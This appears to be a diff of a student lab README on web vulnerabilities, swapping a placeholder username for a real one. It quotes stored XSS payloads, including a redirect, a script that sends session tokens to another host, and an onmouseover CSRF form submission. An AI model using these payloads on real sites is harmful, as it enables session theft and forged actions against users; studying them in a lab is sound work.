@@ -20,7 +20,7 @@ This lab explores the exploitation of web vulnerabilities including **Stored XSS
 - Used `<script>window.location = "http://www.offensive-security.com/"</script>` on blog entry
 - Demonstrated malicious redirection through stored XSS
 - Verified on Windows 10 VM via Firefox
-- Grabbing session tokens using `<script>document.location="http://FOLusername-uws/..."</script>`
+- Grabbing session tokens using `<script>document.location="http://oabolurin-uws/..."</script>`
 
 📸 See `screenshots/slide01.png` and `slide02.png`
 
@@ -30,7 +30,7 @@ This lab explores the exploitation of web vulnerabilities including **Stored XSS
 - Identified and modified a CSRF payload using directory traversal
 - Inserted invisible form submission using:
   ```html
-  <i onmouseover="window.document.getElementById('f').submit()">FOLusername will get A+ in this course</i>
+  <i onmouseover="window.document.getElementById('f').submit()">oabolurin will get A+ in this course</i>
 
 
 
